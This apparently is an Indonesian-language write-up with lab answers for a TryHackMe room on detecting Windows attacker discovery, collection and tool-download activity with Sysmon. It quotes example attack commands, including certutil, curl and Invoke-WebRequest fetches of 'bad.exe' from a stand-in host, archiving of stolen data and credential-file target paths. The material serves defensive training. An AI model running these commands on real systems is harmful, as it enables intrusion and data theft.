# Deteksi-Ancaman-Windows-2
Temukan cara mendeteksi dan menganalisis langkah-langkah awal pelaku ancaman setelah berhasil membobol Windows


Perkenalan
Setelah berhasil menembus sistem host, pelaku ancaman dihadapkan pada pilihan: diam-diam membuat pintu belakang (backdoor) untuk mempertahankan akses jangka panjang atau mengambil tindakan segera untuk mencapai tujuan mereka. Ruangan ini membahas pendekatan kedua dan melanjutkan perjalanan deteksi ancaman Windows Anda dengan mengeksplorasi apa yang biasanya terjadi setelah Akses Awal, dimulai dengan Penemuan dan Pengumpulan.

Tujuan pembelajaran
Mendeteksi teknik penemuan umum menggunakan Log Peristiwa Windows.
Pelajari cara melacak asal serangan dengan merekonstruksi pohon proses.
Cari tahu data apa yang dicari oleh pelaku ancaman dan bagaimana mereka mengeksfiltrasi data tersebut.
Lihat bagaimana perintah berbahaya dicatat dengan menjalankannya sendiri.

# Gambaran Umum Penemuan
Kesadaran Situasional
Setelah para penjahat melewati pintu depan, apakah mereka tahu apa yang ada di balik pintu itu? Sebagian besar tidak tahu, jadi mereka akan mulai mencari di dalam ruangan: mungkin ada harta karun tersembunyi, tetapi mungkin juga jebakan yang siap beraksi. Hal yang sama berlaku untuk pelaku ancaman siber, yang perlu memahami lingkungan, nilainya, dan alat keamanannya yang dapat mengganggu serangan. Proses ini dipetakan ke taktik MITRE  Discovery , yang akan kita bahas dalam tugas ini.

<img width="970" height="285" alt="image" src="https://github.com/user-attachments/assets/4fbfc206-6166-49f2-add9-f58bd63da7b4" />

Perintah Penemuan
Pertanyaan pertama yang mungkin muncul setelah terbangun dari mimpi adalah "Siapa saya?" dan "Di mana saya?". Hal yang sama berlaku untuk pelaku ancaman yang mungkin telah mengirimkan ribuan lampiran phishing ke semua email yang mereka kenal, tetapi hanya berhasil menembus beberapa sistem yang mereka lihat untuk pertama kalinya. Jadi, mereka perlu mengetahui detail korban:

Tujuan Penemuan	Perintah CMD / PowerShell Umum
Berkas dan Folder
(Untuk mengetahui tujuan pelaku, pekerjaan korban, atau minat mereka)	type <file>, Get-Content <file>, dir <folder>,Get-ChildItem <folder>
Pengguna dan Grup
(Untuk mengetahui siapa yang menggunakan host dan dengan hak akses apa)	whoami, net user, net localgroup, query user,Get-LocalUser
Sistem dan Aplikasi
(Untuk menemukan kerentanan atau aplikasi yang dapat digunakan untuk mencuri data)	tasklist /v, systeminfo, wmic product get name,version,Get-Service
Pengaturan Jaringan
(Untuk mengetahui apakah host tersebut termasuk dalam jaringan perusahaan)	ipconfig /all, netstat -ano,netsh advfirewall show allprofiles
Antivirus Aktif
(Untuk mengetahui seberapa berisiko melanjutkan serangan tanpa diblokir)	Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"
Proses Penemuan
Ingat kembali rantai serangan phishing dari ruangan sebelumnya. Setelah lampiran diluncurkan, ia menjalankan perintah penemuan dasar untuk mengidentifikasi korban atau bahkan menghapus dirinya sendiri jika antivirus tertentu terpasang atau korban bukan dari perusahaan atau negara yang ditargetkan. Kemudian, ia terhubung kembali ke pelaku ancaman, memberikan kendali penuh atas korban. Dari sana, penyerang manusia dapat mengetikkan perintah Penemuan tambahan jika diperlukan.

Bagaimana Penyerang Mengendalikan Korban

<img width="1507" height="485" alt="image" src="https://github.com/user-attachments/assets/c6248a5c-add3-41d7-85ed-00eb147d6c90" />


Untuk tugas ini, akses VM yang terlampir dan coba jalankan sendiri perintah Discovery!

Jawablah pertanyaan-pertanyaan di bawah ini.
Buka CMD dan ketik "net user Administrator".
Pengguna tersebut termasuk dalam grup hak akses apa?

cara ketik cmd di lab : net user administrator - lihat group 

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.

jawaban : Administrators

Jawaban yang Benar
Buka Event Viewer dan coba temukan perintah Anda di log Sysmon.
Apa isi kolom "Image" dari perintah net yang baru saja Anda jalankan?

Cari di Bagian 'Log Aplikasi dan Layanan'. Cari 'Microsoft' > 'Windows' > 'Sysmon' > 'Operasional'.
Ketik ID Acara 1 sebagai filter Anda
<img width="1363" height="577" alt="image" src="https://github.com/user-attachments/assets/ebd213ee-24da-4594-bc68-6b0b6b3564e6" />


jawaban : C:\Windows\System32\net.exe

Jawaban yang Benar

# mendeteksi penemuan 
Penemuan melalui CMD
Penemuan melalui baris perintah adalah metode yang paling umum dan termudah yang tersedia bagi pelaku ancaman. Hal ini karena metode ini hanya menggunakan perintah yang sudah ada seperti "whoami" atau "ipconfig" yang tersedia di semua mesin Windows secara default; lihat  artikel ini :https://thedfirreport.com/2024/08/26/blacksuit-ransomware/#collection:~:text=The%20threat%20actor%20performed%20several%20discovery%20commands untuk contoh serangan di dunia nyata. Untungnya bagi pihak yang bertahan, sebagian besar perintah yang dijalankan dicatat sebagai proses baru, seperti pada pohon proses di bawah ini:

Perintah Penemuan yang Berasal dari "invoice.pdf.exe"
C:\Users\victim\Downloads\invoice.pdf.exe
├── C:\Windows\System32\cmd.exe
│   ├── ipconfig                                 // Show network settings
│   ├── whoami /priv                             // Show user permissions
│   ├── dir                                      // List current directory
│   ├── net user                                 // List all local users
│   ├── tasklist /v                              // Show running processes
│   └── wmic computersystem get model            // Query for laptop model
└── C:\Windows\...\powershell.exe
    ├── Get-Service	                             // List active services
    └── Get-MpPreference                         // Check MS Defender settings
Penemuan melalui GUI
Dalam kasus di mana pelaku ancaman masuk ke sistem secara interaktif, seperti setelah pelanggaran RDP, mereka tidak terbatas pada perintah konsol (tetapi mereka sering menggunakannya sebagai kebiasaan). Dengan akses ke antarmuka grafis, tidak ada yang mencegah penyerang untuk menggunakan perangkat yang sama seperti Anda: Aplikasi & Program, Pengaturan Sistem, Manajemen Disk, atau bahkan Penampil Peristiwa. Dalam skenario ini, Anda tidak akan melihat perintah "whoami" yang biasa, melainkan pohon proses yang terlihat seperti ini:

Pohon Proses untuk Penemuan GUI
C:\Windows\System32\explorer.exe
├── C:\Windows\System32\cmd.exe                                   // Attacker can still use CMD!
│   └── ...
├── C:\Windows\system32\mmc.exe C:\Windows\system32\compmgmt.msc  // Open Computer Management
├── C:\Windows\system32\control.exe netconnections                // List network adapters
├── C:\Windows\ImmersiveControlPanel\SystemSettings.exe [...]     // Access settings panel
├── C:\Windows\system32\notepad.exe C:\...\secrets.txt            // Read a text file
└── C:\Windows\system32\taskmgr.exe                               // Run Task Manager
Mendeteksi Penemuan
Tugas pertama untuk mendeteksi potensi Discovery adalah menemukan perintah Discovery, atau lebih tepatnya, serangkaian perintah yang dijalankan dalam waktu singkat. Anda akan melihatnya sebagai peristiwa pembuatan proses yang dilacak oleh ID peristiwa Sysmon 1 atau sebagai baris baru dalam file riwayat PowerShell . Ada banyak perintah Discovery, jadi bersiaplah untuk menggunakan mesin pencari jika Anda tidak yakin apa arti perintah tersebut.

Selanjutnya, penting untuk mengetahui dari mana perintah tersebut berasal. Perintah seperti "ipconfig" sering digunakan oleh departemen TI dan alat yang sah, dan Anda tidak ingin menimbulkan kepanikan hanya karena rekan kerja Anda memeriksa IP mereka. Untuk ruangan ini, Anda dapat membangun pohon proses menggunakan log Sysmon : filter untuk peristiwa pembuatan proses dan korelasikan bidang ProcessId dan ParentProcessId, seperti pada contoh di bawah ini:

<img width="1211" height="285" alt="image" src="https://github.com/user-attachments/assets/9b00d9e5-c288-4681-91ff-f8a5c76b03b8" />

Untuk tugas ini, buka VM dan jalankan contoh lampiran phishing yang terletak di:
C:\Users\Administrator\Desktop\ Practice\Task 3\invoice.pdf.exe

Jawablah pertanyaan-pertanyaan di bawah ini.
Berdasarkan log Sysmon, apa perintah pertama yang dijalankan oleh invoice.pdf.exe?

C:\Users\victim\Downloads\invoice.pdf.exe
├── C:\Windows\System32\cmd.exe
│   ├── ipconfig                                 // Show network settings
│   ├── whoami /priv     

jawaban : whoami

Jawaban yang Benar
Perintah apa yang digunakan malware untuk memeriksa keberadaan MS Defender EDR?

Filter untuk ID Acara 4688: Pembuatan Proses

jawaban : cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"

Jawaban yang Benar
Ke domain mana malware tersebut mengirimkan data yang ditemukan?

exfil.beecz.cafe

Jawaban yang Benar

# Colection Overview / gamabaran umem koleksi
Mencari Rahasia
Melanjutkan skenario kita, apa yang akan dilakukan para penjahat setelah mereka menjelajahi semua ruangan di apartemen, mengetahui siapa pemiliknya, barang berharga apa yang mereka sembunyikan, dan jebakan apa yang ada? Mereka mengambil harta karun sebenarnya - sesuatu yang dapat dijual atau berharga bagi pelaku ancaman. Proses ini melibatkan tiga taktik  MITRE lainnya: Pengumpulan , Akses Kredensial , dan Eksfiltrasi (Untuk menyederhanakannya, mari kita anggap Akses Kredensial sebagai bagian dari Pengumpulan).

<img width="970" height="285" alt="image" src="https://github.com/user-attachments/assets/b4e93ed0-06a7-4d8b-a13a-bb6de64b4c7e" />

Target Pengumpulan
Target serangan sangat berbeda tergantung pada tujuan penyerang. Beberapa penyerang mengincar informasi pribadi seperti gambar atau percakapan obrolan; yang lain mencari dompet kripto, akun game, atau rekening bank; dan kelompok yang lebih canggih hanya menggunakan korban untuk mengakses jaringan perusahaan, dengan harapan dapat melakukan enkripsi ransomware skala penuh.

Perlu dicatat bahwa meskipun sebagian besar data sensitif disimpan sebagai file sederhana, rahasia tersebut juga dapat disembunyikan di registri atau di memori proses. Anda dapat meninjau target Koleksi umum di blok kode di bawah ini:

# [Goal: Blackmail Victim] Photos, Chats, Browser History
C:\Users\<user>\AppData\Roaming\Signal\*
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History

# [Goal: Steal Money] Web Banking Sessions, Crypto Wallets
C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

# [Goal: Steal Corporate Data] SSH Credentials, Databases
C:\Users\<user>\.ssh\*
C:\Program Files\Microsoft SQL Server\...\DATA\*
Mengeksfiltrasi Data
Pengumpulan data dapat dilakukan secara otomatis melalui skrip atau secara manual oleh pelaku ancaman manusia. Untuk skrip, seluruh proses biasanya memakan waktu kurang dari satu menit, tetapi mungkin membutuhkan waktu berjam-jam bagi penyerang untuk menemukan dan meninjau file-file yang menarik. Namun demikian, kedua metode tersebut pada akhirnya akan berakhir dengan eksfiltrasi - mengunggah data yang dicuri ke server pengendali. Di sini, pelaku ancaman dapat sangat kreatif - untuk menghindari deteksi, mereka sering kali:

Mengeksfiltrasi data curian ke DropBox, Mega, Amazon S3 , atau layanan penyimpanan cloud tepercaya lainnya ( Contoh )
Mengeksfiltrasi data curian ke repositori kode yang dikenal seperti GitHub atau aplikasi pesan seperti Telegram ( Contoh )
Atau cukup buat domain yang terlihat terpercaya seperti "windows-updates.com" dan kirim data ke sana.
Untuk tugas ini, lanjutkan dengan VM yang terlampir dan coba temukan data yang perlu dikumpulkan!

Jawablah pertanyaan-pertanyaan di bawah ini.
Apa kata sandi Facebook yang disimpan pengguna di Chrome?
(Menu Chrome > Kata Sandi dan isi otomatis > Pengelola Kata Sandi)

nsAghv51BBav90!

Jawaban yang Benar
Kunci SSH menarik mana yang disimpan pengguna di disk?
(Mulailah pencarian Anda dari C:\Users\Administrator\)

thm-access-database.key

Jawaban yang Benar
Apa isi file PDF rahasia yang menjelaskan jaringan internal TryHackMe?
(Cari file tersebut di Desktop, Unduhan, dan Dokumen)

thm-network-diagram-2025.pdf

Jawaban yang Benar 

# Mendeteksi Koleksi
Mendeteksi Koleksi
Sama seperti pada Discovery, pelaku ancaman dapat menggunakan opsi baris perintah dan antarmuka grafis untuk meninjau file sensitif. Namun, dalam Collection, pelaku ancaman tidak hanya memeriksa konfigurasi sistem tetapi juga mencari file dan folder spesifik yang ditunjukkan pada tugas sebelumnya. Dengan demikian, Anda dapat mendeteksi akses ke file dengan melacak perintah seperti:

Contoh Perintah	Keterangan
notepad.exe C:\Users\<user>\Desktop\finances-2025.csv	Pelaku ancaman menggunakan Notepad untuk memeriksa isi file yang mencurigakan tersebut.
CMD: type debug-logs.txt | findstr password > C:\Temp\passwords.txt	Pelaku ancaman mencari kata kunci "password" dalam file tertentu.
PowerShell: Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf	Pelaku ancaman mencari file PDF di folder beranda pengguna.
PowerShell : copy C:\Users\<user>\AppData\Roaming\Signal С:\Temp\	Pelaku ancaman menyalin riwayat obrolan Signal ke direktori Temp.
PowerShell: Compress-Archive С:\Temp\ С:\Temp\stolen_data.zip	Pelaku ancaman mengarsipkan data yang dicuri, bersiap untuk melakukan eksfiltrasi.
7za.exe a -tzip C:\Temp\stolen_data.zip С:\\Temp\\*.*	Alternatifnya, pelaku ancaman dapat menggunakan perangkat lunak pengarsipan yang sudah ada seperti 7-Zip.
Contoh Koleksi
Selama pengumpulan data secara manual atau saat menggunakan skrip, Anda akan melihat perintah dan proses dasar yang dibahas pada tugas sebelumnya. Dalam insiden ini , pelaku ancaman hanya menggunakan Notepad dan Wordpad untuk membuka file yang diminati, lalu menggunakan 7-Zip untuk mengarsipkan semua file sekaligus. Seperti yang dapat Anda lihat dari tangkapan layar, tindakan tersebut mudah dideteksi dengan ID peristiwa Sysmon 1:

<img width="1450" height="125" alt="image" src="https://github.com/user-attachments/assets/ce77f2c9-973b-4574-88df-4e1d63add6fc" />
Data Stealers

Collection performed by human threat actors is typical for breaches of big networks, where the attacker knows their target and spends much time looking for data to steal. However, attacks targeting simple personal workstations rarely involve human attacker and data collection is performed by a data stealer - specialized malware to automate collection and exfiltration.

For example, Gremlin data stealer, a single malicious file, steals VPN profiles, cryptocurrency wallets, web browser sessions, Steam, Discord, and Telegram data, and even takes screenshots of the victim's host. You can read the details in this Unit42 blog post. Note that data stealers rarely use CMD or PowerShell commands but rely on their own code, making it harder to understand which exact data was accessed or stolen:

<img width="1536" height="278" alt="image" src="https://github.com/user-attachments/assets/9a1276b8-78b7-4b92-80e9-0a945af34b25" />


Fungsi pencuri data mencuri sesi Telegram (unit42.paloaltonetworks.com)

Untuk tugas ini, jalankan contoh pencuri data sederhana dan analisis tindakannya di log:
C:\Users\Administrator\Desktop\Practice\Task 5\stealer.exe

Jawablah pertanyaan-pertanyaan di bawah ini.
Berdasarkan log Sysmon, direktori apa yang dibuat oleh program pencuri data tersebut?

staging_58f1

Jawaban yang Benar
Tiga ekstensi file apa yang dicari oleh malware tersebut?
Format: Pisahkan dengan koma sesuai urutan abjad (misalnya bat, txt)

docx, pdf, xlsx

Jawaban yang Benar
Cmdlet PowerShell mana yang digunakan malware untuk mendapatkan konten clipboard?

Get-ClipBoard

Jawaban yang Benar
Ke domain mana malware tersebut mengirimkan data?

collecteddata-storage-2025.s3.amazonaws.com

Jawaban yang benar 

# Transfer Alat Ingress
Transfer Alat Ingress
Ingat kembali penjelasan di ruangan sebelumnya tentang bagaimana serangan dimulai: bukan dari malware yang berfungsi penuh, tetapi dari lampiran phishing kecil atau dari sesi RDP tanpa alat tim merah apa pun. Dengan demikian, pada beberapa tahap serangan, pelaku ancaman mungkin perlu mengunduh lebih banyak alat untuk mencapai tujuan mereka, misalnya:

Sebuah skrip untuk mengotomatiskan penemuan dan menemukan kerentanan umum seperti sabuk pengaman.
Sebuah alat untuk mengekstrak kata sandi yang tersimpan atau kredensial sistem operasi seperti Mimikatz.
Trojan Akses Jarak Jauh (RAT) yang berfungsi penuh seperti  Remcos RAT
Terakhir, sebuah program ransomware untuk mengenkripsi sistem setelah data dicuri.
Proses pengunduhan malware tambahan ke sistem yang diretas dipetakan ke teknik MITRE Ingress Tool Transfer , dan teknik ini digunakan dalam sebagian besar pelanggaran keamanan. Anda telah melihat contoh di mana lampiran LNK menggunakan PowerShell untuk mengunduh malware tambahan, tetapi ada banyak cara lain untuk mentransfer malware bahkan tanpa PowerShell !

Metode Transfer Umum
Mengapa pelaku ancaman tidak bisa memasukkan semua yang mereka butuhkan ke dalam satu lampiran phishing saja, mungkin Anda bertanya. Ada berbagai alasan, tetapi yang umum adalah untuk melewati antivirus dengan membagi malware menjadi beberapa bagian dan untuk meminimalkan paparan alat/eksploitasi mereka jika mereka tertangkap sejak awal.

Perintah Transfer Alat Ingress	Perintah CMD / PowerShell Umum
Melalui Certutil	certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe
Melalui Curl (Windows 10+)	curl.exe https://blackhat.thm/bad.exe -o good.exe
Melalui PowerShell IWR	powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"
Melalui Antarmuka Grafis	Tidak perlu menggunakan CMD, cukup salin-tempel malware melalui RDP atau unduh melalui peramban web!
Mendeteksi Perpindahan Alat
Karena transfer memerlukan koneksi jaringan, pilihan terbaik Anda adalah melacak koneksi jaringan atau permintaan DNS dari proses yang mencurigakan. Namun, perlu diingat bahwa pelaku ancaman sering mencoba menghindari deteksi dengan mengunduh alat dari layanan yang sah seperti GitHub, jadi pastikan untuk menganalisis proses mana yang membuat koneksi, domain tujuan, dan file yang diunduh. Tangkapan layar di bawah ini menunjukkan rangkaian peristiwa lengkap:

<img width="1046" height="474" alt="image" src="https://github.com/user-attachments/assets/414a723e-e2ba-447e-a037-10b942f9b4dd" />

Untuk tugas ini, lanjutkan dengan VM dan uji sendiri Ingress Tool Transfer! Gunakan
URL http ://appsforfree.thm/trojan.exe untuk menjawab pertanyaan di bawah ini.

Jawablah pertanyaan-pertanyaan di bawah ini.
Buka  browser Chrome di VM dan navigasikan ke URL tersebut.
Apa flag yang ada di responsnya?

THM{just_use_web_browser}

Jawaban yang Benar
Selanjutnya, buka CMD dan unduh file dari URL yang sama menggunakan curl.exe .
Apa flag yang ada di respons tersebut?

THM{curl_is_cool}

Jawaban yang Benar
Lanjutkan dengan CMD dan URL yang sama, tetapi sekarang gunakan certutil.exe .
Apa flag dalam respons tersebut?

THM{abusing_certutil}

Jawaban yang Benar
Terakhir, unduh file yang sama menggunakan PowerShell IWR .
Apa flag yang ada dalam responsnya?

THM{power_of_powershell}

Jawaban yang Benar

# Kesimpulan
Selamat atas keberhasilan menyelesaikan ruangan ini! Mengingat semua tahapan dan perintah memang kerja keras, tetapi mengetahui apa yang terjadi setelah Akses Awal sangat penting untuk memburu ancaman sebelum menimbulkan dampak besar.

Poin-Poin Penting
Penemuan biasanya terjadi segera setelah Akses Awal dan dapat dideteksi dengan Sysmon.
Tahap penemuan (discovery) berfokus pada identifikasi korban, sedangkan tahap pengumpulan (collection) berfokus pada perolehan data sensitif.
Pada setiap tahapan serangan, pelaku ancaman dapat mengekstraksi data yang dicuri atau mengunduh malware baru.
Pelaku ancaman tidak memulai dengan semua alat yang mereka butuhkan, tetapi hanya mengunduh malware baru jika diperlukan.
